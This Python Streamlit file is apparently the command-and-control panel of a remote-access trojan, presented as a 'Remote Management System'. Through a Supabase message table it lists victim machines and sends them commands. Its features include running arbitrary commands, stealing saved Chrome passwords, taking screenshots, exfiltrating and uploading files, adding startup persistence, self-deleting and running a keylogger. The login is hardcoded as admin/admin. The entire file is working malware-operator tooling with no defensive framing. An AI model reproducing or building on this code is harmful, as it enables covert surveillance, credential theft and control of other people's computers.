import streamlit as st
from st_on_hover_tabs import on_hover_tabs
from streamlit_lottie import st_lottie
from supabase import create_client
from datetime import datetime, timezone
import base64
from PIL import Image
import io
import time
import json
import requests

# Initialize session state variables
if 'authenticated' not in st.session_state:
    st.session_state.authenticated = False
if 'selected_client' not in st.session_state:
    st.session_state.selected_client = None
if 'last_response' not in st.session_state:
    st.session_state.last_response = None


supabase_url = st.secrets["url"]
supabase_api_key = st.secrets["api_key"]
supabase = create_client(supabase_url, supabase_api_key)

# Page Configuration
st.set_page_config(
    page_title="Remote Management System",
    page_icon="🖥️",
    layout="wide"
)
try:
    with open("style.css") as f:
        st.markdown('<style>' + f.read() + '</style>', unsafe_allow_html=True)
except Exception:
    pass
# CSS styles with dark theme
st.markdown("""
<style>
    /* Global theme */
    .stApp {
        background-color: #0A0A0A;
        color: #00FF00;
    }
    
    /* Login form styling */
    .login-container {
        max-width: 400px;
        margin: 100px auto;
        padding: 30px;
        border-radius: 10px;
        background-color: #1A1A1A;
        border: 1px solid #00FF00;
        box-shadow: 0 0 20px rgba(0, 255, 0, 0.1);
    }
    .login-header {
        text-align: center;
        color: #00FF00;
        font-size: 28px;
        margin-bottom: 30px;
    }
    
    /* Custom button styling */
    .stButton > button {
        background-color: #1A1A1A !important;
        color: #00FF00 !important;
        border: 1px solid #00FF00 !important;
        border-radius: 5px !important;
        padding: 10px 24px !important;
        transition: all 0.3s ease !important;
    }
    .stButton > button:hover {
        background-color: #00FF00 !important;
        color: #1A1A1A !important;
        box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
    }
    
    /* Input fields */
    .stTextInput > div > div > input {
        background-color: #1A1A1A !important;
        color: #00FF00 !important;
        border: 1px solid #00FF00 !important;
    }
    
    /* Client card styling */
    .client-card {
        background-color: #1A1A1A;
        border: 1px solid #00FF00;
        border-radius: 15px;
        padding: 20px;
        margin: 15px 0;
        cursor: pointer;
        transition: all 0.3s ease;
        box-shadow: 0 0 10px rgba(0, 255, 0, 0.1);
    }
    .client-card:hover {
        transform: scale(1.02);
        box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
    }
    
    /* Status indicators */
    .status-online {
        color: #00FF00;
        font-weight: bold;
    }
    .status-offline {
        color: #FF0000;
        font-weight: bold;
    }
    
    /* Headers */
    .header-title {
        font-size: 2.5rem;
        font-weight: bold;
        color: #00FF00;
        text-align: center;
        margin: 30px 0;
        text-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
    }
    
    /* Response container */
    .response-container {
        background-color: #1A1A1A;
        border: 1px solid #00FF00;
        border-radius: 10px;
        padding: 20px;
        margin: 20px 0;
    }
    
 
    
    /* Hide Streamlit branding */
    #MainMenu {visibility: hidden;}
    footer {visibility: hidden;}

</style>
""", unsafe_allow_html=True)

def authenticate(username, password):
    return username == "admin" and password == "admin"

def show_login():
    # st.markdown("<div class='login-container'>", unsafe_allow_html=True)
    st.markdown("<h1 class='login-header'>Remote Management System</h1>", unsafe_allow_html=True)
    
    username = st.text_input("Username")
    password = st.text_input("Password", type="password")
    
    if st.button("Login"):
        if authenticate(username, password):
            st.session_state.authenticated = True
            # st.experimental_rerun()
        else:
            st.error("Invalid credentials")
    
    st.markdown("</div>", unsafe_allow_html=True)

# Helper functions
def get_last_response(client_id):
    response = supabase.table('messages')\
        .select('*')\
        .eq('client_id', client_id)\
        .order('created_at', desc=True)\
        .limit(4)\
        .execute()
    
    if response.data:
        return response.data[0]
    return None

def decode_image(base64_string: str) -> Image.Image:
    try:
        img_bytes = base64.b64decode(base64_string)
        return Image.open(io.BytesIO(img_bytes))
    except Exception as e:
        st.error(f"Error decoding image: {e}")
        return None

def get_client_status(last_seen: str) -> str:
    try:
        last_seen_time = datetime.fromisoformat(last_seen.replace('Z', '+00:00'))
        time_diff = datetime.now(timezone.utc) - last_seen_time
        return "online" if time_diff.total_seconds() < 60 else "offline"
    except Exception:
        return "unknown"

def send_command(client_id: str, command: str):
    try:
        data = {
            "client_id": client_id,
            "type": "command",
            "content": command,
            "status": "pending",
        }
        result = supabase.table('messages').insert(data).execute()
        return True
    except Exception as e:
        st.error(f"Error sending command: {e}")
        return False

# Dashboard components
def show_command_center(selected_client):
    st.markdown("<h2 style='color: #00FF00;'>Command Center</h2>", unsafe_allow_html=True)
    
    with st.form("command_form"):
        command = st.text_input("Enter Command", placeholder="Type your command here")
        if st.form_submit_button("Execute"):
            if command:
                if send_command(selected_client, f"cmd {command}"):
                    st.success("Command sent successfully!")
                    time.sleep(5)
                    last_response = get_last_response(selected_client)
                    if last_response:
                        # st.markdown("<div class='response-container'>", unsafe_allow_html=True)
                        st.markdown("### Last Response")
                        st.code(last_response['content'])
                        st.markdown("</div>", unsafe_allow_html=True)
def show_password_center(selected_client):
    st.markdown("<h2 style='color: #00FF00;'>Credential Center</h2>", unsafe_allow_html=True)
    
    with st.form("command_form"):
        command = 'chrome'
        if st.form_submit_button("fetch passwords"):
            if command:
                if send_command(selected_client, f"cmd {command}"):
                    st.success("Command sent successfully!")
                    time.sleep(6)
                    last_response = get_last_response(selected_client)
                    if last_response:
                        # st.markdown("<div class='response-container'>", unsafe_allow_html=True)
                        st.markdown("### Last Response")
                        st.code(last_response['content'])
                        st.markdown("</div>", unsafe_allow_html=True)

def show_screenshot(selected_client):
    st.markdown("<h2 style='color: #00FF00;'>Screenshot</h2>", unsafe_allow_html=True)
    
    if st.button("Capture Screenshot"):
        if send_command(selected_client, "get image"):
            st.success("Screenshot request sent!")
            time.sleep(5)
            last_response = get_last_response(selected_client)
            if last_response and last_response['type'] == 'image':
                img = decode_image(last_response['content'])
                if img:
                    st.image(img)

def show_file_manager(selected_client):
    st.markdown("<h2 style='color: #00FF00;'>File Manager</h2>", unsafe_allow_html=True)
    
    operation = st.selectbox(
        "Select Operation",
        ["List Files", "Download File", "Upload File"],
        key="file_operation"
    )
    
    if operation == "List Files":
        directory = st.text_input("Directory", value=".")
        if st.button("List Files"):
            if send_command(selected_client, f"file list {directory}"):
                st.success("List Files command sent!")
                time.sleep(5)
                last_response = get_last_response(selected_client)
                if last_response:
                    st.markdown("<div class='response-container'>", unsafe_allow_html=True)
                    st.code(last_response['content'])
                    st.markdown("</div>", unsafe_allow_html=True)
    
    elif operation == "Download File":
        filepath = st.text_input("File path to download")
        if st.button("Download File"):
            if send_command(selected_client, f"file get {filepath}"):
                st.success("Download command sent!")
                time.sleep(1)
                last_response = get_last_response(selected_client)
                if last_response and last_response['type'] == 'file':
                    try:
                        file_info = json.loads(last_response['content'])
                        file_b64 = file_info.get("content", "")
                        file_bytes = base64.b64decode(file_b64)
                        st.download_button(
                            "Download File",
                            file_bytes,
                            file_name=filepath.split('/')[-1]
                        )
                    except Exception as e:
                        st.error(f"Error processing file: {e}")
    
    elif operation == "Upload File":
        uploaded_file = st.file_uploader("Choose a file to upload")
        destination = st.text_input("Destination path on client", value="C:/destination/")
        if st.button("Upload File"):
            if uploaded_file and destination:
                file_bytes = uploaded_file.read()
                file_b64 = base64.b64encode(file_bytes).decode()
                payload = json.dumps({
                    "destination": destination + uploaded_file.name,
                    "content": file_b64
                })
                if send_command(selected_client, f"file upload {payload}"):
                    st.success("Upload command sent!")
                    time.sleep(1)
                    last_response = get_last_response(selected_client)
                    if last_response:
                        # st.markdown("<div class='response-container'>", unsafe_allow_html=True)
                        st.write("Upload status:", last_response['status'])
                        st.markdown("</div>", unsafe_allow_html=True)

def show_system_control(selected_client):
    st.markdown("<h2 style='color: #00FF00;'>System Control</h2>", unsafe_allow_html=True)
    
    col1, col2, col3 = st.columns(3)
    
    with col1:
        if st.button("Add to Startup"):
            if send_command(selected_client, "add startup"):
                st.success("Added to startup!")
                
    with col2:
        if st.button("Remove from Startup"):
            if send_command(selected_client, "remove startup"):
                st.success("Removed from startup!")
                
    with col3:
        if st.button("Self Delete"):
            send_command(selected_client, "self delete")
            st.success("Self-delete initiated!")

def show_keylogger_center(selected_client):
    st.markdown("<h2 style='color: #00FF00;'>Keylogger Center</h2>", unsafe_allow_html=True)
    
    col1, col2 = st.columns(2)
    
    with col1:
        if st.button("Start Keylogger"):
            if send_command(selected_client, "start keylogs"):
                st.success("Keylogger started!")
                
    with col2:
        if st.button("Stop Keylogger"):
            if send_command(selected_client, "stop keylogs"):
                st.success("Keylogger stopped - check message history for logs")
                time.sleep(2)
                last_response = get_last_response(selected_client)
                if last_response:
                    st.markdown("### Recent Keylog Data")
                    st.code(last_response['content'])

def show_message_history(selected_client):
    st.header("Message History")
    if st.button("Refresh Messages"):
        messages = supabase.table('messages')\
            .select('*')\
            .eq('client_id', selected_client)\
            .order('created_at', desc=True)\
            .limit(50)\
            .execute()
            
        for msg in messages.data:
            with st.expander(
                f"{msg['type'].upper()} - {msg['created_at']}",
                expanded=False
            ):
                if msg['type'] == 'text':
                    st.code(msg['content'], language='bash')
                elif msg['type'] == 'image':
                    img = decode_image(msg['content'])
                    if img:
                        st.image(img)
                elif msg['type'] == 'file':
                    try:
                        file_info = json.loads(msg['content'])
                        filename = file_info.get("filename", "downloaded_file")
                        file_b64 = file_info.get("content", "")
                        file_bytes = base64.b64decode(file_b64)
                        st.download_button("Download File", file_bytes, file_name=filename)
                    except Exception as e:
                        st.error(f"Error processing file message: {e}")
                st.text(f"Status: {msg['status']}")
def show_home():
    st.markdown("<div class='header-title'>Remote Management System</div>", unsafe_allow_html=True)
    
    clients = supabase.table('clients')\
            .select('*')\
            .order('last_seen', desc=True)\
            .execute()

    if not clients.data:
        st.warning("No clients connected")
        return

    cols = st.columns(3)
    for idx, c in enumerate(clients.data):
        status = get_client_status(c['last_seen'])
        card_html = f"""
        <div class="client-card">
            <h3>{c['hostname']}</h3>
            <p><strong>ID:</strong> {c['client_id']}</p>
            <p><strong>OS:</strong> {c['os']}</p>
            <p><strong>IP:</strong> {c['ip_address']}</p>
            <p><strong>Status:</strong> <span class="status-{status}">{status.upper()}</span></p>
            <p><strong>Last Seen:</strong> {c['last_seen']}</p>
        </div>"""
        cols[idx % 3].markdown(card_html, unsafe_allow_html=True)
        if cols[idx % 3].button("Manage", key=c['client_id']):
            st.session_state.selected_client = c['client_id']
            # st.experimental_rerun()

def main():
    if not st.session_state.authenticated:
        show_login()
    else:
        # Sidebar with hover tabs
        with st.sidebar:
            if st.session_state.selected_client:
                tabs = on_hover_tabs(
                    tabName=['Home', 'Command', 'Screenshot', 'Files', 'Credentials', 'Keylogger', 'System', 'History'],
                    iconName=['house', 'terminal', 'camera', 'folder', 'key', 'keyboard', 'settings', 'folder'],
                    styles={
                        'navtab': {
                            'background-color': '#1A1A1A',
                            'color': '#00FF00',
                            'font-size': '16px',
                            'transition': '.3s',
                            'white-space': 'nowrap',
                            'text-transform': 'uppercase'
                        },
                        'tabOptionsStyle': {
                            ':hover': {'color': '#1A1A1A', 'background-color': '#00FF00'}
                        },
                        'iconStyle': {
                            'position': 'fixed',
                            'left': '7.5px',
                            'text-align': 'left'
                        },
                        'tabStyle': {
                            'list-style-type': 'none',
                            'margin-bottom': '30px',
                            'padding-left': '30px'
                        }
                    }
                )
                
                if st.button("LT", key="logout"):
                    st.session_state.authenticated = False
                    st.session_state.selected_client = None
                    # st.experimental_rerun()
            else:
                st.title("Navigation")
                st.write("Select a client to view options")
                

        if st.session_state.selected_client:
            st.markdown(f"<div class='header-title'>Managing Client: {st.session_state.selected_client}</div>", unsafe_allow_html=True)
            
            if tabs == "Command":
                show_command_center(st.session_state.selected_client)
            if tabs == "Credentials":
                show_password_center(st.session_state.selected_client)
            elif tabs == "Screenshot":
                show_screenshot(st.session_state.selected_client)
            elif tabs == "Files":
                show_file_manager(st.session_state.selected_client)
            elif tabs == "Keylogger":
                show_keylogger_center(st.session_state.selected_client)
            elif tabs == "System":
                show_system_control(st.session_state.selected_client)
            elif tabs == "History":
                show_message_history(st.session_state.selected_client)
            elif tabs == "Home":
                show_home()
        else:
            show_home()

if __name__ == "__main__":
    main()
